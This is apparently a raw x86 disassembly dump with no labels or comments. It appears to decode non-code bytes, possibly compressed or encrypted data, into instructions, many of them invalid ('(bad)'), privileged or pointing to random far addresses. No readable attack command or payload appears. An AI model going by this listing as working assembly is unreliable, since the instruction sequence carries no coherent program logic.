  428586:	ins    DWORD PTR es:[edi],dx
  428587:	call   0x1ad6:0x1df1df2a
  42858e:	mov    es,WORD PTR [esi+0x78]
  428591:	cmp    BYTE PTR [eax+eax*1-0x7df32546],bh
  428598:	add    BYTE PTR [edi+0xd6900d9],bh
  42859e:	fwait
  42859f:	int3   
  4285a0:	shl    cl,0xee
  4285a3:	hlt    
  4285a4:	inc    edx
  4285a5:	and    BYTE PTR [ebx+0x4d1ded2e],0x5
  4285ac:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4285ad:	scas   al,BYTE PTR es:[edi]
  4285ae:	(bad)  
  4285af:	mov    esi,0xa21e20e2
  4285b4:	add    ebp,esp
  4285b6:	push   0xffffff8e
  4285b8:	retf   0x10a8
  4285bb:	push   esi
  4285bc:	xchg   edx,eax
  4285bd:	fdivr  DWORD PTR [edx+0x1e014394]
  4285c3:	dec    ecx
  4285c4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4285c5:	pop    esi
  4285c6:	int    0x70
  4285c8:	mov    bh,0xb6
  4285ca:	mov    ah,0x2a
  4285cc:	lods   al,BYTE PTR ds:[esi]
  4285cd:	add    ch,BYTE PTR [edx]
  4285cf:	in     al,0x44
  4285d1:	icebp  
  4285d2:	call   0xbebeb83f
  4285d7:	push   0xfffffffe
  4285d9:	cmp    BYTE PTR [eax+0x6e],al
  4285dc:	lock lock jp 0x428637
  4285e0:	xchg   ebp,ebp
  4285e2:	jb     0x428656
  4285e4:	clc    
  4285e5:	mov    es,eax
  4285e7:	jbe    0x428639
  4285e9:	clc    
  4285ea:	in     al,0x0
  4285ec:	jp     0x428639
  4285ee:	add    cl,bl
  4285f0:	in     al,dx
  4285f1:	push   0xe62ef7eb
  4285f6:	push   0x700b5abb
  4285fb:	sbb    dh,ch
  4285fd:	out    0x70,eax
  4285ff:	imul   edi,esp,0x3415b5b8
  428605:	fnstenv [ebp+ebp*2+0x4]
  428609:	mov    al,ds:0x8e6b1e5f
  42860e:	or     eax,0xb2138575
  428613:	dec    ebp
  428614:	mov    ah,0x4c
  428616:	cmp    BYTE PTR [ecx-0x66],bh
  428619:	aam    0x1c
  42861b:	dec    edx
  42861c:	or     ecx,DWORD PTR [ecx]
  42861e:	pop    ecx
  42861f:	ins    BYTE PTR es:[edi],dx
  428620:	jbe    0x42868c
  428622:	push   edx
  428623:	ret    
  428624:	jno    0x4285ca
  428626:	mov    dh,0x7d
  428628:	dec    esp
  428629:	push   eax
  42862a:	loop   0x428655
  42862c:	dec    ecx
  42862d:	dec    esp
  42862e:	retf   
  42862f:	push   cs
  428630:	inc    esp
  428631:	fadd   DWORD PTR [esi]
  428633:	fcmovnbe st,st(1)
  428635:	test   al,0x3b
  428637:	in     al,0x59
  428639:	rcr    esp,cl
  42863b:	in     al,dx
  42863c:	pop    esi
  42863d:	xlat   BYTE PTR ds:[ebx]
  42863e:	or     ch,BYTE PTR [eax+edi*4]
  428641:	and    BYTE PTR [esi-0x30],dl
  428644:	push   ebp
  428645:	fcomi  st,st(4)
  428647:	pop    esp
  428648:	dec    eax
  428649:	and    DWORD PTR [ecx],0x47
  42864c:	inc    ecx
  42864d:	sub    esi,DWORD PTR [eax+0x4e]
  428650:	jb     0x428603
  428652:	mov    esi,0x9ca324a7
  428657:	inc    ecx
  428658:	inc    ebx
  428659:	inc    edi
  42865a:	push   edi
  42865b:	scas   al,BYTE PTR es:[edi]
  42865c:	stos   BYTE PTR es:[edi],al
  42865d:	mov    ch,0x6c
  42865f:	stos   DWORD PTR es:[edi],eax
  428660:	xchg   edx,eax
  428661:	enter  0xbf6,0xa
  428665:	mov    ch,BYTE PTR [ecx+ecx*1-0x51]
  428669:	or     bh,dh
  42866b:	pop    ebx
  42866c:	dec    eax
  42866d:	push   0x50f0702a
  428672:	push   ecx
  428673:	push   ebp
  428674:	pusha  
  428675:	pop    eax
  428676:	ficomp WORD PTR [edx-0xa]
  428679:	into   
  42867a:	retf   0x1c11
  42867d:	pop    edi
  42867e:	aam    0x55
  428680:	data16 fnstcw WORD PTR [ecx+ebx*1+0x19d7ec]
  428688:	leave  
  428689:	sahf   
  42868a:	fimul  WORD PTR ds:0x5edfcd5d
  428690:	out    dx,eax
  428691:	xor    BYTE PTR [eax],al
  428693:	cmc    
  428694:	jbe    0x428696
  428696:	pop    ebp
  428697:	out    dx,eax
  428698:	and    BYTE PTR [esi-0x3e],0xcd
  42869c:	add    BYTE PTR [eax+0x15],ch
  42869f:	pop    ebp
  4286a0:	sbb    cl,BYTE PTR [ebp+0x5e]
  4286a3:	arpl   WORD PTR [eax],dx
  4286a5:	cmp    edx,ecx
  4286a7:	(bad)  
  4286a8:	rsm    
  4286aa:	sahf   
  4286ab:	mov    eax,0x1ebcbf44
  4286b0:	add    al,0x6c
  4286b2:	hlt    
  4286b3:	pop    edx
  4286b4:	iret   
  4286b5:	fcom   st(5)
  4286b7:	lahf   
  4286b8:	push   cs
  4286b9:	les    ebp,FWORD PTR [ebx+0x3a2b0d6b]
  4286bf:	test   al,0x15
  4286c1:	fs jae 0x42865f
  4286c4:	loopne 0x42871c
  4286c6:	and    al,BYTE PTR [edx+0x76]
  4286c9:	iret   
  4286ca:	inc    eax
  4286cb:	ret    
  4286cc:	es (bad) 
  4286ce:	sub    al,0xc4
  4286d0:	je     0x428740
  4286d2:	mov    eax,0x88af0d6e
  4286d7:	and    al,0x5a
  4286da:	xlat   BYTE PTR ds:[ebx]
  4286db:	jb     0x428664
  4286dd:	(bad)  
  4286de:	in     al,dx
  4286df:	arpl   WORD PTR [eax],dx
  4286e1:	jp     0x42872e
  4286e3:	dec    ebp
  4286e4:	call   0x54fe799
  4286e9:	lods   eax,DWORD PTR ds:[esi]
  4286ea:	mov    eax,ds:0x82e602c2
  4286ef:	call   0xd8bb:0xb08f1886
  4286f6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4286f7:	arpl   WORD PTR [ebp+0x46],bp
  4286fa:	call   0x3ffb:0xa049005e
  428701:	push   0x9
  428703:	shl    BYTE PTR [esi+0x35],1
  428706:	je     0x42877e
  428708:	(bad)  
  428709:	sbb    BYTE PTR [ecx],bh
  42870b:	pop    esi
  42870c:	cmp    al,0xe2
  42870e:	rcr    DWORD PTR [ebx+0x1b],0x75
  428712:	jp     0x42873a
  428714:	out    0x8e,al
  428716:	out    0x16,al
  428718:	jecxz  0x4286ec
  42871a:	add    dl,bl
  42871c:	sbb    BYTE PTR [eax+0x51],bh
  42871f:	cmp    ebp,DWORD PTR [ebp+eax*1-0x57]
  428723:	and    ah,ah
  428725:	add    edx,eax
  428727:	mov    fs,WORD PTR [eax+0x7a0035a8]
  42872d:	sub    eax,DWORD PTR [eax+0x48]
  428730:	bound  esp,QWORD PTR [edi-0x5a]
  428733:	mov    cl,0x9a
  428735:	xchg   BYTE PTR [edx+0x38],bl
  428738:	xchg   ecx,eax
  428739:	pop    ecx
  42873a:	sub    BYTE PTR [eax],ch
  42873c:	push   0xffffffb8
  42873e:	bound  ebx,QWORD PTR [esi+0x3138cfc2]
  428744:	(bad)  
  428745:	mov    DWORD PTR [esp+eax*8],esi
  428748:	mov    dl,0x5
  42874a:	mov    esi,0x6c4678c3
  42874f:	add    BYTE PTR [esi],0xb
  428752:	fadd   QWORD PTR [edx+0x3c]
  428755:	lods   eax,DWORD PTR ds:[esi]
  428756:	nop
  428757:	jmp    0x42879a
  428759:	(bad)  
  42875a:	popa   
  42875b:	xor    al,0x18
  42875d:	jbe    0x42877f
  42875f:	push   0x10a007bc
  428764:	mov    al,0xa9
  428766:	add    BYTE PTR [esi+0x6ffd223f],cl
  42876c:	dec    ecx
  42876d:	je     0x4287b3
  42876f:	cld    
  428770:	push   0xacce022c
  428775:	cmp    BYTE PTR [esi],ch
  428777:	pop    ss
  428778:	push   ebp
  428779:	add    al,0x56
  42877b:	les    esp,FWORD PTR [esi+0x6d6b89e]
  428781:	xlat   BYTE PTR ds:[ebx]
  428782:	data16 data16 adc al,0xe
  428786:	cdq    
  428787:	pop    ebp
  428788:	out    dx,al
  428789:	xlat   BYTE PTR ds:[ebx]
  42878a:	in     al,dx
  42878b:	sub    BYTE PTR [edx-0x777747fb],dh
  428791:	inc    eax
  428792:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  428793:	mov    edx,gs
  428795:	push   cs
  428796:	push   edx
  428797:	add    bl,BYTE PTR [edx+0x2b]
  42879a:	adc    BYTE PTR [edx-0x6b59ed9a],cl
  4287a0:	fcom   DWORD PTR [esi]
  4287a2:	inc    edi
  4287a3:	mov    ds:0xc2a86459,al
  4287a8:	jns    0x4287f5
  4287aa:	xor    edi,esp
  4287ac:	lds    ebp,FWORD PTR [ecx-0x66]
  4287af:	mov    ch,BYTE PTR [eax-0xec20b8a]
  4287b5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4287b6:	push   ebx
  4287b7:	shl    DWORD PTR [ecx*2+0x9fb31fe],1
  4287be:	(bad)  
  4287bf:	clc    
  4287c0:	test   al,0x1
  4287c2:	arpl   WORD PTR ds:[edx],si
  4287c5:	ins    DWORD PTR es:[edi],dx
  4287c6:	and    al,0x60
  4287c8:	popa   
  4287c9:	call   0xbe7cb237
  4287ce:	adc    bh,dh
  4287d0:	push   es
  4287d1:	pop    esp
  4287d2:	jbe    0x4287a0
  4287d4:	push   esi
  4287d5:	shl    BYTE PTR [edx*1-0x2920364a],1
  4287dc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4287dd:	(bad)  
  4287de:	pop    ebp
  4287df:	ret    
  4287e0:	imul   ebx,DWORD PTR [edx-0x291568f6],0x68d541d0
  4287ea:	call   0x55da:0x653a3a6
  4287f1:	fild   QWORD PTR [edi]
  4287f3:	ins    BYTE PTR es:[edi],dx
  4287f4:	push   eax
  4287f5:	lods   al,BYTE PTR ds:[esi]
  4287f6:	stos   BYTE PTR es:[edi],al
  4287f7:	add    al,0xa4
  4287f9:	fsubr  DWORD PTR [ecx]
  4287fb:	mov    ebp,0xb12b4aca
  428800:	push   es
  428801:	rcr    BYTE PTR [edx+0x3bbe57],1
  428807:	in     al,dx
  428808:	ins    DWORD PTR es:[edi],dx
  428809:	int    0x46
  42880b:	adc    dl,bl
  42880d:	adc    al,0xad
  42880f:	clc    
  428810:	(bad)  
  428811:	ficom  DWORD PTR [esi]
  428813:	pop    edx
  428814:	jg     0x42883c
  428816:	add    DWORD PTR [ebp+0x4dd16b43],eax
  42881c:	add    al,0x83
  42881e:	add    cl,dl
  428820:	dec    edx
  428821:	xor    BYTE PTR [ecx-0x757d3f62],0xa2
  428828:	xchg   BYTE PTR [eax+0x2a],dl
  42882b:	mov    dl,0xe9
  42882d:	push   esp
  42882e:	outs   dx,DWORD PTR ds:[esi]
  42882f:	xor    BYTE PTR ds:0x2e475d15,dl
  428835:	repnz mov dh,0xe5
  428838:	hlt    
  428839:	addr16 xchg esp,eax
  42883b:	loop   0x428858
  42883d:	add    BYTE PTR [eax+0xd],0xc8
  428841:	push   0x435ad6e4
  428846:	adc    DWORD PTR [eax-0x69190988],0x93e80ddc
  428850:	hlt    
  428851:	mov    al,ds:0x482b5ac
  428856:	add    BYTE PTR [esp+ebx*8-0xb6617f5],bl
  42885d:	add    BYTE PTR ds:0x9a5e5d05,al
  428863:	cmp    al,0x17
  428865:	dec    eax
  428866:	lahf   
  428867:	or     DWORD PTR [edx],0x606c6205
  42886d:	nop
  42886e:	retf   0xc148
  428871:	mov    ecx,0x54954160
  428876:	es push ecx
  428878:	add    bh,ch
  42887a:	add    BYTE PTR [esp+esi*4],bl
  42887d:	dec    ebx
  42887e:	imul   eax,DWORD PTR [ecx+0x41],0x1a
  428882:	shl    BYTE PTR [esp+ebx*4-0x459ae8],0xd
  42888a:	lahf   
  42888b:	(bad)  
  42888c:	sbb    eax,0x802f861
  428891:	mov    bh,0xfb
  428893:	add    BYTE PTR [edi],al
  428895:	jns    0x428897
  428897:	mov    eax,0x647000f7
  42889c:	xor    eax,0xf3bd0c9b
  4288a1:	jno    0x428845
  4288a3:	ja     0x42891e
  4288a5:	repz sub dh,BYTE PTR [edi-0x769087ea]
  4288ac:	add    ah,cl
  4288ae:	or     eax,DWORD PTR [ebp-0x56493700]
  4288b4:	mov    ebp,0x7f2408a0
  4288b9:	dec    esi
  4288ba:	add    BYTE PTR [esp+esi*8-0x29a2b321],al
  4288c1:	or     al,BYTE PTR [ecx-0x6d]
  4288c4:	imul   ebx,DWORD PTR [edx+0x7086defc],0x188954e3
  4288ce:	dec    edx
  4288cf:	pop    ebx
  4288d0:	popa   
  4288d1:	call   0x174d45bd
  4288d6:	inc    eax
  4288d7:	push   ebx
  4288d8:	mov    al,0x46
  4288da:	imul   edx,ebp,0x72d0b254
  4288e0:	jno    0x4288c2
  4288e2:	pop    eax
  4288e3:	das    
  4288e4:	mov    bh,cl
  4288e6:	(bad)  
  4288e7:	jne    0x4288b3
  4288e9:	pop    edx
  4288ea:	jns    0x4288c6
  4288ec:	push   edi
  4288ed:	push   esp
  4288ee:	adc    eax,0x7d54ff22
  4288f3:	sbb    al,0x3
  4288f5:	rol    DWORD PTR [eax],1
  4288f7:	xor    DWORD PTR [ebx-0x10cb2b18],0xb1a36f8
  428901:	int3   
  428902:	mov    DWORD PTR [ebp+0x208d0f00],edi
  428908:	fsub   st,st(4)
  42890a:	fcom   DWORD PTR [ebx]
  42890c:	lds    esi,FWORD PTR [esi]
  42890e:	and    dl,BYTE PTR [edi]
  428910:	shr    BYTE PTR [esi+eiz*8-0x60],0xa
  428915:	or     dl,BYTE PTR [ebx+ebx*1-0x2f61668e]
  42891c:	shr    ebx,1
  42891e:	push   ecx
  42891f:	rcr    BYTE PTR [ebp-0x75eb54c],0x8
  428926:	(bad)  
  428927:	outs   dx,DWORD PTR ds:[esi]
  428928:	push   0x2b14a557
  42892d:	out    0xd0,eax
  42892f:	das    
  428930:	loop   0x428980
  428932:	mov    ds:0x7e0ed322,al
  428937:	xor    edi,ebp
  428939:	mov    BYTE PTR [edi+esi*1+0x4f58930e],ah
  428940:	ret    0x9ab5
  428943:	fidivr DWORD PTR [ecx+0x30e84cc6]
  428949:	fstp   TBYTE PTR [edx-0x43]
  42894c:	pushf  
  42894d:	add    BYTE PTR [ebx+0x5a],al
  428950:	ss inc edi
  428952:	mov    edx,DWORD PTR [edx]
  428954:	in     al,dx
  428955:	push   0x4b9cc5f8
  42895a:	xor    bh,BYTE PTR [eax-0x57]
  42895d:	inc    eax
  42895e:	inc    eax
  42895f:	adc    DWORD PTR [edx+0x74],0xffffffcd
  428963:	out    0x28,al
  428965:	cwde   
  428966:	call   0xd538:0x57621d16
  42896d:	or     esp,eax
  42896f:	mov    al,es:0x342c4226
  428975:	clc    
  428976:	pop    edi
  428977:	mov    dl,0x94
  428979:	xor    al,0x6c
  42897b:	int    0xf0
  42897d:	sbb    al,0x0
  42897f:	loope  0x4289bf
  428981:	into   
  428982:	inc    eax
  428983:	in     eax,0x4c
  428985:	imul   ebx,DWORD PTR [edx],0xfffffffe
  428988:	cmp    BYTE PTR [esi+0x0],dh
  42898b:	xor    dl,bl
  42898d:	sbb    eax,0x22f1a47c
  428992:	xchg   BYTE PTR ds:0x401419ad,dl
  428998:	cmc    
  428999:	dec    esp
  42899a:	jnp    0x428a06
  42899c:	stc    
  42899d:	sub    al,0x2
  42899f:	test   al,0x82
  4289a1:	push   edx
  4289a2:	sbb    eax,DWORD PTR [eax]
  4289a4:	jb     0x428a1a
  4289a6:	dec    ebx
  4289a7:	bound  edx,QWORD PTR [ecx-0x6d]
  4289aa:	mov    al,0x82
  4289ac:	xchg   DWORD PTR [eax],esp
  4289ae:	add    eax,0x8742c4d
  4289b3:	mov    eax,ds:0x8fcc09a6
  4289b8:	pop    esp
  4289b9:	not    BYTE PTR [ecx+0x561d0db4]
  4289bf:	jbe    0x428945
  4289c1:	(bad)  
  4289c2:	out    0x9f,eax
  4289c4:	outs   dx,BYTE PTR ds:[esi]
  4289c5:	inc    ecx
  4289c6:	fistp  WORD PTR [eax*4+0x3b1c0b0e]
  4289cd:	sub    eax,0xba665390
  4289d2:	lods   eax,DWORD PTR ds:[esi]
  4289d3:	sbb    ebx,DWORD PTR [ebp-0x79]
  4289d6:	shl    BYTE PTR [esi],1
  4289d8:	ret    
  4289d9:	stos   BYTE PTR es:[edi],al
  4289da:	pop    ds
  4289db:	or     BYTE PTR [edx],bh
  4289dd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4289de:	adc    esi,edx
  4289e0:	lods   al,BYTE PTR ds:[esi]
  4289e1:	add    ch,BYTE PTR [eax+ebp*2+0x68]
  4289e5:	fdivr  QWORD PTR [ebp+0x2c]
  4289e8:	mov    cl,0xc8
  4289ea:	inc    ebp
  4289eb:	into   
  4289ec:	mov    esi,0x80533414
  4289f1:	xchg   edi,eax
  4289f2:	pop    esi
  4289f3:	clc    
  4289f4:	jbe    0x4289c7
  4289f6:	mov    bl,BYTE PTR [esi-0x80]
  4289f9:	mov    ss,eax
  4289fb:	gs jbe 0x4289c8
  4289fe:	pusha  
  4289ff:	test   eax,0x4c9b1c2a
  428a04:	ds pop eax
  428a06:	test   al,0xc
  428a08:	and    al,0x52
  428a0a:	mov    ah,0x4
  428a0c:	sub    ebx,DWORD PTR [ebx+ebp*1]
  428a0f:	mov    eax,0xdc0664b5
  428a14:	jmp    0x6aa:0x2802367b
  428a1b:	int3   
  428a1c:	idiv   BYTE PTR [esi]
  428a1e:	test   DWORD PTR [edx+0x53],ebx
  428a21:	mov    ch,0xe9
  428a23:	(bad)  
  428a24:	ins    BYTE PTR es:[edi],dx
  428a25:	pop    eax
  428a26:	ds ret 0x7e4e
  428a2a:	dec    edi
  428a2b:	push   edx
  428a2c:	enter  0x6a12,0xcd
  428a30:	sub    edx,DWORD PTR [edx-0x45]
  428a33:	add    BYTE PTR ds:0x9128b63d,dh
  428a39:	push   0xffffffb0
  428a3b:	dec    ebp
  428a3c:	hlt    
  428a3d:	pushf  
  428a3e:	and    ebp,DWORD PTR ds:0x892416fe
  428a44:	loop   0x428a3e
  428a46:	sub    DWORD PTR [edi-0x79],edx
  428a49:	leave  
  428a4a:	jmp    0xf2b3:0xd2741cda
  428a51:	mov    eax,ds:0x4a474161
  428a56:	dec    eax
  428a57:	out    0x18,al
  428a59:	sar    cl,1
  428a5b:	sub    al,0xdb
  428a5d:	add    al,bl
  428a5f:	and    BYTE PTR [ebx],0x6
  428a62:	nop
  428a63:	sbb    BYTE PTR [eax-0x1f93af0f],bl
  428a69:	mov    bl,0x54
  428a6b:	(bad)  
  428a6c:	cli    
  428a6d:	or     dh,0xc8
  428a70:	jecxz  0x428a3c
  428a72:	in     eax,dx
  428a73:	cwde   
  428a74:	js     0x428a83
  428a76:	dec    esp
  428a77:	daa    
  428a78:	(bad)  
  428a79:	lock cmp DWORD PTR [esi-0x52c2b731],0xff1cdd8a
  428a84:	ret    0xd9ba
  428a87:	push   ecx
  428a88:	push   ecx
  428a89:	and    al,0xc1
  428a8b:	mov    eax,0x71b3541f
  428a90:	repnz add dl,dl
  428a93:	jbe    0x428af6
  428a95:	sub    al,0x28
  428a97:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  428a98:	add    eax,DWORD PTR [edx-0x29]
  428a9b:	test   eax,eax
  428a9d:	jns    0x428a57
  428a9f:	mov    DWORD PTR [eax],0x245b8eda
  428aa5:	fiadd  DWORD PTR [ecx]
  428aa7:	call   0x41693944
  428aac:	sub    esi,DWORD PTR [eax-0xab189f3]
  428ab2:	push   ss
  428ab3:	mov    al,BYTE PTR [ebx+0x70]
  428ab6:	pop    edi
  428ab7:	test   al,0x54
  428ab9:	or     ah,BYTE PTR [edi+0x60]
  428abc:	in     eax,0xfd
  428abe:	inc    eax
  428abf:	xor    BYTE PTR [ecx+0x3],cl
  428ac2:	mov    ah,0xc2
  428ac4:	push   esi
  428ac5:	cs pop edx
  428ac7:	jecxz  0x428afd
  428ac9:	mov    cl,bh
  428acb:	jmp    0x145d14f4
  428ad0:	aam    0x50
  428ad2:	test   BYTE PTR [ebp+ebp*2-0x1f95f5aa],cl
  428ad9:	nop
  428ada:	fdivr  st,st(2)
  428adc:	std    
  428add:	aad    0xd6
  428adf:	imul   ebp,DWORD PTR [edi+edx*1+0x6c],0xffffffb0
  428ae4:	pop    ebp
  428ae5:	and    BYTE PTR [ebx+ebx*8-0x4e],ch
  428ae9:	and    cl,0xc1
  428aec:	int3   
  428aed:	inc    ebx
  428aee:	add    BYTE PTR [edx-0x11],dh
  428af1:	push   0xb6d25130
  428af6:	jg     0x428a88
  428af8:	imul   ecx,ebx,0x77d1f500
  428afe:	push   esp
  428aff:	xor    al,0x63
  428b01:	(bad)  
  428b02:	fistp  QWORD PTR [esi-0x7b]
  428b05:	aaa    
  428b06:	add    BYTE PTR [eax-0x28],bh
  428b09:	cmp    BYTE PTR [ebp-0x27f15176],cl
  428b0f:	jle    0x428b67
  428b11:	cli    
  428b12:	inc    esi
  428b13:	jp     0x428b5e
  428b15:	je     0x428aaf
  428b17:	mov    dl,BYTE PTR [esi+0x4a]
  428b1a:	xchg   esp,eax
  428b1b:	sbb    dl,ah
  428b1d:	add    eax,DWORD PTR [eax-0x652f29eb]
  428b23:	adc    BYTE PTR [edx],bh
  428b25:	outs   dx,BYTE PTR ds:[esi]
  428b26:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  428b27:	push   cs
  428b28:	pusha  
  428b29:	ins    DWORD PTR es:[edi],dx
  428b2a:	inc    edi
  428b2b:	xlat   BYTE PTR ds:[ebx]
  428b2c:	push   0xffffff8c
  428b2e:	out    dx,al
  428b2f:	xchg   esi,eax
  428b30:	push   edi
  428b31:	sahf   
  428b32:	push   0xffffffbc
  428b34:	sub    BYTE PTR [edx],ch
  428b36:	pop    eax
  428b37:	and    DWORD PTR [esp+eax*8],eax
  428b3a:	or     dh,BYTE PTR ds:0x741c00a9
  428b40:	dec    eax
  428b41:	icebp  
  428b42:	push   eax
  428b43:	pop    eax
  428b44:	outs   dx,DWORD PTR ds:[esi]
  428b45:	sub    DWORD PTR [eax+0x63103472],edi
  428b4b:	push   0x77043073
  428b50:	xor    edi,DWORD PTR [ecx+esi*4-0x58]
  428b54:	mov    ds:0x70fd9235,eax
  428b59:	addr16 inc edx
  428b5b:	push   ebp
  428b5c:	add    bl,BYTE PTR [ebx]
  428b5e:	stc    
  428b5f:	int    0xbc
  428b61:	call   0xfc49bb97
  428b66:	cmp    BYTE PTR [edi-0x770cf500],ah
  428b6c:	setnp  BYTE PTR [edi]
  428b6f:	mov    ch,0xd
  428b71:	out    0x8b,al
  428b73:	mov    ebp,0xb838527c
  428b78:	add    BYTE PTR [edi],dl
  428b7a:	fistp  QWORD PTR [ebx-0x19f28000]
  428b80:	int    0x1b
  428b82:	in     eax,dx
  428b83:	mov    esi,0xaaee1f00
  428b88:	xor    esi,ebp
  428b8a:	out    0x45,al
  428b8c:	or     ecx,DWORD PTR [esi]
  428b8e:	(bad)  
  428b8f:	aas    
  428b90:	test   BYTE PTR [ebp-0x18],bh
  428b93:	inc    esp
  428b94:	fadd   QWORD PTR [eax]
  428b96:	lods   eax,DWORD PTR ds:[esi]
  428b97:	mov    bl,al
  428b99:	mov    ah,dh
  428b9b:	mov    bl,ah
  428b9d:	mov    eax,0xb5330095
  428ba2:	inc    esi
  428ba3:	and    eax,0x8af35ec7
  428ba8:	dec    esi
  428ba9:	adc    eax,0xc56aa78a
  428bae:	push   0x6d
  428bb0:	add    ah,bl
  428bb2:	mov    eax,0x22f35357
  428bb7:	es mov eax,0x901a00bb
  428bbd:	jbe    0x428c22
  428bbf:	ds call 0x7eb0:0xb960aba6
  428bc7:	sbb    DWORD PTR [esi],esp
  428bc9:	mov    ds:0x1d04a607,eax
  428bce:	jg     0x428bf0
  428bd0:	cmp    BYTE PTR [ebp-0x1b24ffe8],dh
  428bd6:	pop    ebp
  428bd7:	pop    edx
  428bd8:	mov    bh,BYTE PTR [esi+0x20]
  428bdb:	rcl    ah,0x1a
  428bde:	shr    BYTE PTR [eax+eax*1+0x144ff8de],cl
  428be5:	cmp    BYTE PTR [esi],dh
  428be7:	fcomp  DWORD PTR [esi-0x77]
  428bea:	cmp    DWORD PTR [edi-0x24],0x40964e84
  428bf1:	push   edi
  428bf2:	sti    
  428bf3:	ret    0xde17
  428bf6:	inc    edx
  428bf7:	push   es
  428bf8:	add    ah,al
  428bfa:	call   0xb532:0x4ad6c848
  428c01:	xchg   BYTE PTR [edi],cl
  428c03:	push   0xffffffcc
  428c05:	nop
  428c06:	sbb    dh,ch
  428c08:	enter  0x6432,0xb4
  428c0c:	or     eax,0x222d5655
  428c11:	xchg   esi,eax
  428c12:	retf   0x3ae4
  428c15:	in     al,dx
  428c16:	mov    esp,0xb474d583
  428c1b:	ins    BYTE PTR es:[edi],dx
  428c1c:	loop   0x428bb9
  428c1e:	scas   al,BYTE PTR es:[edi]
  428c1f:	or     bl,al
  428c21:	inc    edx
  428c22:	or     eax,0x26da8bcd
  428c27:	test   al,0xa8
  428c29:	mov    dh,0x2a
  428c2b:	rol    BYTE PTR [eax],cl
  428c2d:	lods   al,BYTE PTR ds:[esi]
  428c2e:	cs cwde 
  428c30:	nop
  428c31:	mov    edx,0xf005a51e
  428c36:	adc    ch,ah
  428c38:	cmp    al,0x16
  428c3a:	inc    esp
  428c3b:	cwde   
  428c3c:	jmp    0xf51d7099
  428c41:	sbb    ah,dh
  428c43:	stos   BYTE PTR es:[edi],al
  428c44:	clc    
  428c45:	push   ds
  428c46:	in     eax,dx
  428c47:	scas   al,BYTE PTR es:[edi]
  428c48:	and    dl,BYTE PTR [ebx+0x45]
  428c4b:	xchg   DWORD PTR [ebx+0x67212f0],esp
  428c51:	loop   0x428bdb
  428c53:	jbe    0x428bf5
  428c55:	jns    0x428ca8
  428c57:	inc    ebp
  428c58:	or     bh,dl
  428c5a:	mov    eax,?
  428c5c:	push   cs
  428c5d:	stc    
  428c5e:	add    BYTE PTR [eax-0xe],dh
  428c61:	rcl    DWORD PTR [eax-0x4f],0xab
  428c65:	add    BYTE PTR [eax+esi*4-0xa],dh
  428c69:	or     DWORD PTR [edx],0x5c
  428c6c:	(bad)  
  428c6d:	sbb    cl,BYTE PTR [edx+0x40844a15]
  428c73:	(bad)  
  428c74:	mov    ch,0x58
  428c76:	sub    ebx,DWORD PTR [edx]
  428c78:	ins    BYTE PTR es:[edi],dx
  428c79:	push   ebx
  428c7a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  428c7b:	scas   al,BYTE PTR es:[edi]
  428c7c:	fs pop ebp
  428c7e:	push   ss
  428c7f:	push   0xa5ea9485
  428c84:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  428c85:	out    0x4d,al
  428c87:	adc    eax,0x9e5e528e
  428c8c:	add    cl,ah
  428c8e:	ins    DWORD PTR es:[edi],dx
  428c8f:	cli    
  428c90:	push   esi
  428c91:	jge    0x428cdd
  428c93:	(bad)  
  428c94:	cwde   
  428c95:	addr16 call 0x9a6e:0xed4e6bfa
  428c9d:	out    0x6f,al
  428c9f:	sbb    bh,dh
  428ca1:	pushf  
  428ca2:	dec    edx
  428ca3:	add    BYTE PTR [ebx-0x68],dh
  428ca6:	add    ch,dh
  428ca8:	dec    ebp
  428ca9:	lahf   
  428caa:	inc    eax
  428cab:	adc    BYTE PTR [ebp+0x7a],dl
  428cae:	es pop esp
  428cb0:	std    
  428cb1:	pushf  
  428cb2:	xchg   ecx,eax
  428cb3:	test   eax,0x465c4841
  428cb8:	popa   
  428cb9:	inc    eax
  428cba:	xor    bh,BYTE PTR [ecx+0x49]
  428cbd:	(bad)  
  428cbe:	lods   eax,DWORD PTR ds:[esi]
  428cbf:	cbw    
  428cc1:	in     al,0xbe
  428cc3:	dec    ebx
  428cc4:	out    dx,eax
  428cc5:	stos   DWORD PTR es:[edi],eax
  428cc6:	fimul  DWORD PTR [ebp-0x6b]
  428cc9:	retf   0xf272
  428ccc:	and    eax,DWORD PTR [eax]
  428cce:	push   edx
  428ccf:	mov    BYTE PTR [edi+0x78],dl
  428cd2:	pop    esi
  428cd3:	in     eax,0x45
  428cd5:	xchg   cl,bl
  428cd7:	gs mov eax,0xb8aaac02
  428cdd:	loopne 0x428ce9
  428cdf:	and    BYTE PTR [esp+eax*1-0x64e935be],dl
  428ce6:	(bad)  
  428ce7:	push   es
  428ce8:	or     DWORD PTR [edx],0xffffffe4
  428ceb:	ret    0x56ce
  428cee:	imul   DWORD PTR [edx]
  428cf0:	pop    ebp
  428cf1:	pop    ebp
  428cf2:	sbb    eax,0x18e9f697
  428cf7:	pop    ebx
  428cf8:	jp     0x428ce6
  428cfa:	add    bl,BYTE PTR [eax+0x6a]
  428cfd:	sbb    eax,0xe6bc0d05
  428d02:	(bad)  
  428d03:	push   ebp
  428d04:	push   es
  428d05:	jecxz  0x428ca7
  428d07:	push   edx
  428d08:	xor    BYTE PTR [eax+edi*4+0x462acb],ch
  428d0f:	scas   eax,DWORD PTR es:[edi]
  428d10:	adc    BYTE PTR [ebx],cl
  428d12:	and    BYTE PTR [eax*1-0x2f533cba],dl
  428d19:	sbb    cl,BYTE PTR [esi-0x56]
  428d1c:	adc    dh,ch
  428d1e:	dec    ecx
  428d1f:	mov    al,ds:0xc2406880
  428d24:	jb     0x428d51
  428d26:	fiadd  DWORD PTR [edx+0x69f41f66]
  428d2c:	cs xor al,0xa
  428d2f:	inc    esi
  428d30:	lock and BYTE PTR [edi],0xb2
  428d34:	das    
  428d35:	mov    al,0x35
  428d37:	pop    ecx
  428d38:	imul   ebx,DWORD PTR [edx],0x6a
